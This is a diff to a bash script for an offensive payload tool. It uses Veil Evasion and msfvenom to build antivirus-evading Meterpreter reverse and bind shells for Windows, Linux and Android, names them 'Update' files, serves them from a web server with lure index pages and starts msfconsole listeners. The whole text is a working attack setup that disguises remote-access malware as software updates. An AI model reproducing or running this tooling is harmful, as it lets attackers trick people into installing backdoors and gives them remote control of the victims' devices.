@@ -20,23 +20,20 @@ echo -e "$w"
 #Windows
 if [ $resp1 = 1 ]; then
   clear
-  echo -e "$g 1.$w Powershell - Reverse_TCP"
-  echo -e "$g 2.$w Powershell - Bind_TCP"
-  echo -e "$g 3.$w Shell - Reverse_TCP"
-  echo -e "$g 4.$w Shell - Bind_TCP"
+  echo -e "$g 1.$w Updateshell - Reverse_TCP"
   echo -ne "Choice : $g"
   read resp2
   echo -e "$w"
 #Linux
 elif [ $resp1 = 2 ]; then
   clear
-  echo -e "$g 1.$w Shell - Reverse_TCP"
-  echo -e "$g 2.$w Shell - Bind_TCP"
+  echo -e "$g 1.$w Python - Reverse_TCP"
+  echo -e "$g 2.$w Ruby - Reverse_TCP"
   echo -ne "Choice : $g"
   read resp2
   echo -e "$w"
 #Android
-elif [ $resp1 = 2 ]; then
+elif [ $resp1 = 3 ]; then
   clear
   echo -e "$g 1.$w Meterpreter - Reverse_TCP"
   echo -e "$g 2.$w Meterpreter - Bind_TCP"
@@ -51,60 +48,53 @@ fi
 if [ $resp1 = 0 ]; then
 echo -e "$g Skipping the payload creation...$w"
 paychoice=0
-#Windows - Powershell - Reverse_tcp
+#Windows - Updateshell - Reverse_tcp
 elif [ $resp1 = 1 ] && [ $resp2 = 1 ]; then
   clear
   echo -e "$g Creating payload...$w"
-  ./res/Veil/Veil.py -t Evasion -p powershell/meterpreter/rev_tcp.py --ip $(hostname -I) --port 4444 -o /var/www/html/power.bat
+  cd ../res/Veil/
+  rm -r /var/lib/veil/output/source
+  mkdir /var/lib/veil/output/source
+  ./Veil.py -t evasion -p Updateshell/meterpreter/rev_tcp.py --ip $(hostname -I) --port 4444 -o Update
+  mv /var/lib/veil/output/source/Update.bat /var/www/html/
   echo "$done"
   paychoice=11
-#Windows - Powershell - Bind_TCP
-elif [ $resp1 = 1 ] && [ $resp2 = 2 ]; then
-  clear
-  echo -e "$g Creating payload...$w"
-  msfvenom -p windows/powershell_bind_tcp RHOST=$(hostname -I) LPORT=4444 -f powershell > /var/www/html/power.bat
-  echo "$done"
-  paychoice=12
-#Windows - Shell - Reverse_tcp
-elif [ $resp1 = 1 ] && [ $resp2 = 3 ]; then
-  clear
-  echo -e "$g Creating payload...$w"
-  msfvenom -p windows/shell/reverse_tcp LHOST=$(hostname -I) LPORT=4444 > /var/www/html/power.bat
-  echo "$done"
-  paychoice=13
-#Windows - Shell - Bind_TCP
-elif [ $resp1 = 1 ] && [ $resp2 = 4 ]; then
-  clear
-  echo -e "$g Creating payload...$w"
-  msfvenom -p windows/shell/reverse_tcp RHOST=$(hostname -I) LPORT=4444 > /var/www/html/power.bat
-  echo "$done"
-  paychoice=14
-#Linux - Shell - Reverse_TCP
+#Linux - Python - Reverse_TCP
 elif [ $resp1 = 2 ] && [ $resp2 = 1 ]; then
   clear
   echo -e "$g Creating payload...$w"
-  msfvenom -p linux/x86/shell/reverse_tcp LHOST=$(hostname -I) LPORT=4444 > /var/www/html/power.sh
+  cd ../res/Veil/
+  rm -r /var/lib/veil/output/source
+  mkdir /var/lib/veil/output/source
+  ./Veil.py -t evasion -p python/meterpreter/rev_tcp.py --ip $(hostname -I) --port 4444 -o Update
+  mv /var/lib/veil/output/source/Update.py /var/www/html/
   echo "$done"
   paychoice=21
-#Linux - Shell - Bind_TCP
+#Linux - Ruby - Bind_TCP
 elif [ $resp1 = 2 ] && [ $resp2 = 2 ]; then
   clear
   echo -e "$g Creating payload...$w"
-  msfvenom -p linux/x86/shell/bind_tcp RHOST=$(hostname -I) LPORT=4444 > /var/www/html/power.sh
+  cd ../res/Veil/
+  rm -r /var/lib/veil/output/source
+  mkdir /var/lib/veil/output/source
+  ./Veil.py -t evasion -p ruby/meterpreter/rev_tcp.py --ip $(hostname -I) --port 4444 -o Update
+  mv /var/lib/veil/output/source/Update.rb /var/www/html/
   echo "$done"
   paychoice=22
-#Android - Meterpreter - Reverse_TCPRev
+#Android - Meterpreter - Reverse_TCP
 elif [ $resp1 = 3 ] && [ $resp2 = 1 ]; then
-  clearRev
-  echo -e "$g Creating payload...$w"Rev
-  msfvenom -p android/meterpreter/reverse_tRevcp LHOST=$(hostname -I) LPORT=4444 > /var/www/html/power.apk
+  clear
+  cd ../res/Veil/
+  echo -e "$g Creating payload...$w"
+  msfvenom -p android/meterpreter/reverse_tcp LHOST=$(hostname -I) LPORT=4444 > /var/www/html/Update.apk
   echo "$done"
   paychoice=31
 #Android - Meterpreter - Bind_TCP
 elif [ $resp1 = 3 ] && [ $resp2 = 2 ]; then
   clear
+  cd ../res/Veil/
   echo -e "$g Creating payload...$w"
-  msfvenom -p android/meterpreter/bind_tcp RHOST=$(hostname -I) LPORT=4444 > /var/www/html/power.apk
+  msfvenom -p android/meterpreter/bind_tcp RHOST=$(hostname -I) LPORT=4444 > /var/www/html/Update.apk
   echo "$done"
   paychoice=32
 else
@@ -119,31 +109,27 @@ echo -e "$b Apache2 successfuly restarted.$w"
 #service apache2 status
 
 echo -e "$g Starting the listener.. (this may take a while..)$w"
-cd rb
+cd ../../src/rb
 if [ "$paychoice" = "0" ]; then
   exit 1
 elif [ "$paychoice" = "11" ]; then
+  cp ../html_indexes/index_windows_BAT.html /var/www/html/index.html
   cd windows
-  msfconsole -r ListenWindowsPowerRevTCP.rb
-elif [ "$paychoice" = "12" ]; then
-  cd windows
-  msfconsole -r ListenWindowsPowerBindTCP.rb
-elif [ "$paychoice" = "13" ]; then
-  cd windows
-  msfconsole -r ListenWindowsShellRevTCP.rb
-elif [ "$paychoice" = "14" ]; then
-  cd windows
-  msfconsole -r ListenWindowsShellBindTCP.rb
+  msfconsole -r ListenWindowsUpdateRevTCP.rb
 elif [ "$paychoice" = "21" ]; then
+  cp ../html_indexes/index_linux_PY.html /var/www/html/index.html
   cd linux
   msfconsole -r ListenLinuxShellRevTCP.rb
 elif [ "$paychoice" = "22" ]; then
+  cp ../html_indexes/index_linux_RB.html /var/www/html/index.html
   cd linux
   msfconsole -r ListenLinuxShellBindTCP.rb
 elif [ "$paychoice" = "31" ]; then
+  cp ../html_indexes/index_android_APK.html /var/www/html/index.html
   cd android
   msfconsole -r ListenAndroRevTCP.rb
 elif [ "$paychoice" = "32" ]; then
+  cp ../html_indexes/index_android_APK_BIND.html /var/www/html/index.html
   cd android
   msfconsole -r ListenAndroBindTCP.rb
 fi
